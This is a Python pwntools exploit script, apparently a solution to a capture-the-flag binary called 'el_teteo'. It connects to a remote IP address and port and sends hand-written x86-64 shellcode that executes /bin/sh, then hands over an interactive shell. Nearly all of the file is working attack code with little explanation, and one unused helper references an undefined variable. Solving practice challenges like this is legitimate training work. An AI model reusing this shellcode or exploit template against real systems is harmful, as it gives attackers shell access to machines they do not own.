#!/usr/bin/python3

from pwn import *

exe = ELF("el_teteo_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
brva 0x1caf
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.57.1:52712"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 10

shellcode = bytes.fromhex(
    "f30f1efa"          # ENDBR64
    "31d2"              # xor edx, edx
    "48bb2f62696e2f736800"  # mov rbx, 0x0068732f6e69622f
    "53"                # push rbx
    "4889e7"            # mov rdi, rsp
    "52"                # push rdx
    "57"                # push rdi
    "4889e6"            # mov rsi, rsp
    "31c0"              # xor eax, eax
    "b03b"              # mov al, 0x3b
    "0f05"              # syscall
)

io.recvuntil(b"> ")
io.send(shellcode)

io.interactive()
